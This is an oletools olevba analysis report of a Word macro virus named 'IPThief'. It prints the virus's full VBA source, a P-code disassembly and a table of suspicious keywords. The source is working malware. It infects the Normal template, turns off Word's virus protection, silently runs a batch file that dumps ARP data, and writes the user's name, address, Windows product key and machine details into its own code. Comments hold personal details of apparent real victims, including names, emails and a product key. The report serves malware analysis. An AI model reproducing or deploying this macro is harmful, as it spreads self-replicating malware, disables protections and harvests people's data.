olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tif
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO IPThief.cls 
in file: Virus.MSWord.Tif - OLE stream: 'Macros/VBA/IPThief'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'IP Thief virus --> @@@###$$$%%%!!!^^^&&&***
'by THE BUG
' User Name     - Rio&Umi 4ever together
' Initials      - Rio
' User Address  - rio96@student.te.ugm.ac.id
' Word Version  - 8.0
' Windows Key   -
' Processor     -
' Vendor        -
' Computer Name - Win95A-Office
'
' Date when this normal was infected - 10-06-2000
' Time when this normal was infected - 08:19:11
'/**/**/**/**/**/**/**/**/**/**/**/**/**/**
' User Name     - JonMMx 2000
' Initials      - MeMeX
' User Address  - JonMMx2000@yahoo.com
' Word Version  - 8.0
' Windows Key   - MD97J-QC7R7-TQJGD-3V2WM-W7PVM
' Processor     - x86 Family 6 Model 8 Stepping 3
' Vendor        - GenuineIntel
' Computer Name - TEST04
'
' Date when this normal was infected - 02-22-2001
' Time when this normal was infected - 09:44:53
'/**/**/**/**/**/**/**/**/**/**/**/**/**/**
' User Name     - Harry H.
' Initials      - HH
' User Address  -
' Word Version  - 8.0
' Windows Key   - MD97J-QC7R7-TQJGD-3V2WM-W7PVM
' Processor     - Pentium(r) II Processor
' Vendor        - GenuineIntel
' Computer Name - MK106
'
' Date when this normal was infected - 08-09-2001
' Time when this normal was infected - 03:02:11
'/**/**/**/**/**/**/**/**/**/**/**/**/**/**


Private Sub Document_Open()
'Bem, se alguém mais er... vamos dizer... inteligente pegar este vírus e ler o source dele, alguma coisa de, er..., útil, vai poder fazer... com certeza!
'É. Eu tentei fazer um vírus de macro que roubasse IP. Não sei se funciona direito pq eu ainda não testei... se essa merda não funcionar direito NÃO fiquem me ENCHENDO O SACO dizendo QUE ESSA PORRA TEM BUG. (THE BUG hehehe)
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Set T = Me.VBProject.VBComponents.Item(1)
Set a = ActiveDocument.VBProject.VBComponents.Item(1)
Set n = NormalTemplate.VBProject.VBComponents.Item(1)
If n.Name <> "IPThief" Or n.Name = "IPThief" And n.CodeModule.Lines(1, 1) <> "'IP Thief virus --> @@@###$$$%%%!!!^^^&&&***" Then
IPThiefCode = T.CodeModule.Lines(1, T.CodeModule.CountOfLines)
n.CodeModule.DeleteLines 1, n.CodeModule.CountOfLines
n.CodeModule.addfromstring IPThiefCode
n.Name = "IPThief"
'It'z completely useless, isn't?
Open "C:\GetIp.Bat" For Output As #1
Print #1, "C:\WINDOWS\ARP -A > C:\IP.TXT"
Close #1
n.CodeModule.addfromstring "' User Name     - " & Application.UserName
n.CodeModule.addfromstring "' Initials      - " & Application.UserInitials
n.CodeModule.addfromstring "' User Address  - " & Application.UserAddress
n.CodeModule.addfromstring "' Word Version  - " & Application.Version
n.CodeModule.addfromstring "' Windows Key   - " & System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "ProductKey")
n.CodeModule.addfromstring "' Processor     - " & System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Hardware\Description\System\CentralProcessor\0", "Identifier")
n.CodeModule.addfromstring "' Vendor        - " & System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Hardware\Description\System\CentralProcessor\0", "VendorIdentifier")
n.CodeModule.addfromstring "' Computer Name - " & System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ComputerName", "ComputerName")
n.CodeModule.addfromstring "' "
n.CodeModule.addfromstring "' Date when this normal was infected - " & Date$
n.CodeModule.addfromstring "' Time when this normal was infected - " & Time$
n.CodeModule.addfromstring "'/**/**/**/**/**/**/**/**/**/**/**/**/**/**"
End If
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
Private Sub Document_Close()
Application.EnableCancelKey = wdCancelDisabled
Set T = Me.VBProject.VBComponents.Item(1)
Set a = ActiveDocument.VBProject.VBComponents.Item(1)
Set n = NormalTemplate.VBProject.VBComponents.Item(1)
If a.Name <> "IPThief" Or a.Name = "IPThief" And a.CodeModule.Lines(1, 1) <> "'IP Thief virus --> @@@###$$$%%%!!!^^^&&&***" Then
IPThiefCode = n.CodeModule.Lines(1, n.CodeModule.CountOfLines)
a.CodeModule.DeleteLines 1, a.CodeModule.CountOfLines
a.CodeModule.addfromstring IPThiefCode
a.Name = "IPThief"
End If
End Sub
Sub AutoExec()
On Error Resume Next
If Dir("C:\GetIp.Bat") = "" Then MakeGetIp
'Only if user is online
Shell "C:\GetIp.Bat", vbHide
End Sub
Sub AutoExit()
On Error Resume Next
Set n = NormalTemplate.VBProject.VBComponents.Item(1)
Open "c:\IP.TXT" For Input As #1
If LOF(1) = 0 Then GoTo Q
Do While Not EOF(1)
Line Input #1, a
If a = "Nenhuma entrada ARP foi encontrada" Then GoTo Merda
n.CodeModule.addfromstring "' " & a
Loop
Q:
n.CodeModule.addfromstring "'The IP between [ ] is the IP of the user " & Application.UserName
Close #1
'Check if NETBUS are installed
WindowsDir = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
If Dir(WindowsDir + "\Patch.exe") <> "" Then n.CodeModule.addfromstring "'The user " & Application.UserName & " are infected by NETBUS"
n.CodeModule.addfromstring "'/**/**/**/**/**/**/**/**/**/**/**/**/**/**"
Merda:
End Sub
Private Sub MakeGetIp()
Open "C:\GetIp.Bat" For Output As #1
Print #1, "C:\WINDOWS\ARP -A > C:\IP.TXT"
Close #1
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Tif
' ===============================================================================
' Module streams:
' Macros/VBA/IPThief - 10300 bytes
' Line #0:
' 	QuoteRem 0x0000 0x002B "IP Thief virus --> @@@###$$$%%%!!!^^^&&&***"
' Line #1:
' 	QuoteRem 0x0000 0x000A "by THE BUG"
' Line #2:
' 	QuoteRem 0x0000 0x0027 " User Name     - Rio&Umi 4ever together"
' Line #3:
' 	QuoteRem 0x0000 0x0014 " Initials      - Rio"
' Line #4:
' 	QuoteRem 0x0000 0x002B " User Address  - rio96@student.te.ugm.ac.id"
' Line #5:
' 	QuoteRem 0x0000 0x0014 " Word Version  - 8.0"
' Line #6:
' 	QuoteRem 0x0000 0x0010 " Windows Key   -"
' Line #7:
' 	QuoteRem 0x0000 0x0010 " Processor     -"
' Line #8:
' 	QuoteRem 0x0000 0x0010 " Vendor        -"
' Line #9:
' 	QuoteRem 0x0000 0x001E " Computer Name - Win95A-Office"
' Line #10:
' 	QuoteRem 0x0000 0x0000 ""
' Line #11:
' 	QuoteRem 0x0000 0x0030 " Date when this normal was infected - 10-06-2000"
' Line #12:
' 	QuoteRem 0x0000 0x002E " Time when this normal was infected - 08:19:11"
' Line #13:
' 	QuoteRem 0x0000 0x002A "/**/**/**/**/**/**/**/**/**/**/**/**/**/**"
' Line #14:
' 	QuoteRem 0x0000 0x001C " User Name     - JonMMx 2000"
' Line #15:
' 	QuoteRem 0x0000 0x0016 " Initials      - MeMeX"
' Line #16:
' 	QuoteRem 0x0000 0x0025 " User Address  - JonMMx2000@yahoo.com"
' Line #17:
' 	QuoteRem 0x0000 0x0014 " Word Version  - 8.0"
' Line #18:
' 	QuoteRem 0x0000 0x002E " Windows Key   - MD97J-QC7R7-TQJGD-3V2WM-W7PVM"
' Line #19:
' 	QuoteRem 0x0000 0x0030 " Processor     - x86 Family 6 Model 8 Stepping 3"
' Line #20:
' 	QuoteRem 0x0000 0x001D " Vendor        - GenuineIntel"
' Line #21:
' 	QuoteRem 0x0000 0x0017 " Computer Name - TEST04"
' Line #22:
' 	QuoteRem 0x0000 0x0000 ""
' Line #23:
' 	QuoteRem 0x0000 0x0030 " Date when this normal was infected - 02-22-2001"
' Line #24:
' 	QuoteRem 0x0000 0x002E " Time when this normal was infected - 09:44:53"
' Line #25:
' 	QuoteRem 0x0000 0x002A "/**/**/**/**/**/**/**/**/**/**/**/**/**/**"
' Line #26:
' 	QuoteRem 0x0000 0x0019 " User Name     - Harry H."
' Line #27:
' 	QuoteRem 0x0000 0x0013 " Initials      - HH"
' Line #28:
' 	QuoteRem 0x0000 0x0010 " User Address  -"
' Line #29:
' 	QuoteRem 0x0000 0x0014 " Word Version  - 8.0"
' Line #30:
' 	QuoteRem 0x0000 0x002E " Windows Key   - MD97J-QC7R7-TQJGD-3V2WM-W7PVM"
' Line #31:
' 	QuoteRem 0x0000 0x0028 " Processor     - Pentium(r) II Processor"
' Line #32:
' 	QuoteRem 0x0000 0x001D " Vendor        - GenuineIntel"
' Line #33:
' 	QuoteRem 0x0000 0x0016 " Computer Name - MK106"
' Line #34:
' 	QuoteRem 0x0000 0x0000 ""
' Line #35:
' 	QuoteRem 0x0000 0x0030 " Date when this normal was infected - 08-09-2001"
' Line #36:
' 	QuoteRem 0x0000 0x002E " Time when this normal was infected - 03:02:11"
' Line #37:
' 	QuoteRem 0x0000 0x002A "/**/**/**/**/**/**/**/**/**/**/**/**/**/**"
' Line #38:
' Line #39:
' Line #40:
' 	FuncDefn (Private Sub Document_Open())
' Line #41:
' 	QuoteRem 0x0000 0x0098 "Bem, se alguém mais er... vamos dizer... inteligente pegar este vírus e ler o source dele, alguma coisa de, er..., útil, vai poder fazer... com certeza!"
' Line #42:
' 	QuoteRem 0x0000 0x00DE "É. Eu tentei fazer um vírus de macro que roubasse IP. Não sei se funciona direito pq eu ainda não testei... se essa merda não funcionar direito NÃO fiquem me ENCHENDO O SACO dizendo QUE ESSA PORRA TEM BUG. (THE BUG hehehe)"
' Line #43:
' 	OnError (Resume Next) 
' Line #44:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #45:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set T 
' Line #46:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set a 
' Line #47:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set n 
' Line #48:
' 	Ld n 
' 	MemLd New 
' 	LitStr 0x0007 "IPThief"
' 	Ne 
' 	Ld n 
' 	MemLd New 
' 	LitStr 0x0007 "IPThief"
' 	Eq 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x002C "'IP Thief virus --> @@@###$$$%%%!!!^^^&&&***"
' 	Ne 
' 	And 
' 	Or 
' 	IfBlock 
' Line #49:
' 	LitDI2 0x0001 
' 	Ld T 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld T 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St IPThiefCode 
' Line #50:
' 	LitDI2 0x0001 
' 	Ld n 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #51:
' 	Ld IPThiefCode 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #52:
' 	LitStr 0x0007 "IPThief"
' 	Ld n 
' 	MemSt New 
' Line #53:
' 	QuoteRem 0x0000 0x001F "It'z completely useless, isn't?"
' Line #54:
' 	LitStr 0x000C "C:\GetIp.Bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "C:\WINDOWS\ARP -A > C:\IP.TXT"
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #57:
' 	LitStr 0x0012 "' User Name     - "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #58:
' 	LitStr 0x0012 "' Initials      - "
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #59:
' 	LitStr 0x0012 "' User Address  - "
' 	Ld Application 
' 	MemLd UserAddress 
' 	Concat 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #60:
' 	LitStr 0x0012 "' Word Version  - "
' 	Ld Application 
' 	MemLd Version 
' 	Concat 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #61:
' 	LitStr 0x0012 "' Windows Key   - "
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "ProductKey"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Concat 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #62:
' 	LitStr 0x0012 "' Processor     - "
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_LOCAL_MACHINE\Hardware\Description\System\CentralProcessor\0"
' 	LitStr 0x000A "Identifier"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Concat 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #63:
' 	LitStr 0x0012 "' Vendor        - "
' 	LitStr 0x0000 ""
' 	LitStr 0x0041 "HKEY_LOCAL_MACHINE\Hardware\Description\System\CentralProcessor\0"
' 	LitStr 0x0010 "VendorIdentifier"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Concat 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #64:
' 	LitStr 0x0012 "' Computer Name - "
' 	LitStr 0x0000 ""
' 	LitStr 0x004D "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\ComputerName\ComputerName"
' 	LitStr 0x000C "ComputerName"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Concat 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #65:
' 	LitStr 0x0002 "' "
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #66:
' 	LitStr 0x0027 "' Date when this normal was infected - "
' 	Ld Date$ 
' 	Concat 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #67:
' 	LitStr 0x0027 "' Time when this normal was infected - "
' 	Ld Time$ 
' 	Concat 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #68:
' 	LitStr 0x002B "'/**/**/**/**/**/**/**/**/**/**/**/**/**/**"
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #71:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #72:
' 	EndSub 
' Line #73:
' 	FuncDefn (Private Sub Document_Close())
' Line #74:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #75:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld id_FFFF 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set T 
' Line #76:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set a 
' Line #77:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set n 
' Line #78:
' 	Ld a 
' 	MemLd New 
' 	LitStr 0x0007 "IPThief"
' 	Ne 
' 	Ld a 
' 	MemLd New 
' 	LitStr 0x0007 "IPThief"
' 	Eq 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld a 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x002C "'IP Thief virus --> @@@###$$$%%%!!!^^^&&&***"
' 	Ne 
' 	And 
' 	Or 
' 	IfBlock 
' Line #79:
' 	LitDI2 0x0001 
' 	Ld n 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St IPThiefCode 
' Line #80:
' 	LitDI2 0x0001 
' 	Ld a 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld a 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #81:
' 	Ld IPThiefCode 
' 	Ld a 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #82:
' 	LitStr 0x0007 "IPThief"
' 	Ld a 
' 	MemSt New 
' Line #83:
' 	EndIfBlock 
' Line #84:
' 	EndSub 
' Line #85:
' 	FuncDefn (Sub AutoExec())
' Line #86:
' 	OnError (Resume Next) 
' Line #87:
' 	LitStr 0x000C "C:\GetIp.Bat"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall MakeGetIp 0x0000 
' 	EndIf 
' Line #88:
' 	QuoteRem 0x0000 0x0016 "Only if user is online"
' Line #89:
' 	LitStr 0x000C "C:\GetIp.Bat"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #90:
' 	EndSub 
' Line #91:
' 	FuncDefn (Sub AutoExit())
' Line #92:
' 	OnError (Resume Next) 
' Line #93:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set n 
' Line #94:
' 	LitStr 0x0009 "c:\IP.TXT"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #95:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Q 
' 	EndIf 
' Line #96:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #97:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #98:
' 	Ld a 
' 	LitStr 0x0022 "Nenhuma entrada ARP foi encontrada"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Merda 
' 	EndIf 
' Line #99:
' 	LitStr 0x0002 "' "
' 	Ld a 
' 	Concat 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #100:
' 	Loop 
' Line #101:
' 	Label Q 
' Line #102:
' 	LitStr 0x002A "'The IP between [ ] is the IP of the user "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #103:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #104:
' 	QuoteRem 0x0000 0x001D "Check if NETBUS are installed"
' Line #105:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000A "SystemRoot"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St WindowsDir 
' Line #106:
' 	Ld WindowsDir 
' 	LitStr 0x000A "\Patch.exe"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000A "'The user "
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0017 " are infected by NETBUS"
' 	Concat 
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' 	EndIf 
' Line #107:
' 	LitStr 0x002B "'/**/**/**/**/**/**/**/**/**/**/**/**/**/**"
' 	Ld n 
' 	MemLd CodeModule 
' 	ArgsMemCall addfromstring 0x0001 
' Line #108:
' 	Label Merda 
' Line #109:
' 	EndSub 
' Line #110:
' 	FuncDefn (Private Sub MakeGetIp())
' Line #111:
' 	LitStr 0x000C "C:\GetIp.Bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #112:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "C:\WINDOWS\ARP -A > C:\IP.TXT"
' 	PrintItemNL 
' Line #113:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #114:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |GetIp.Bat           |Executable file name                         |
|IOC       |Patch.exe           |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

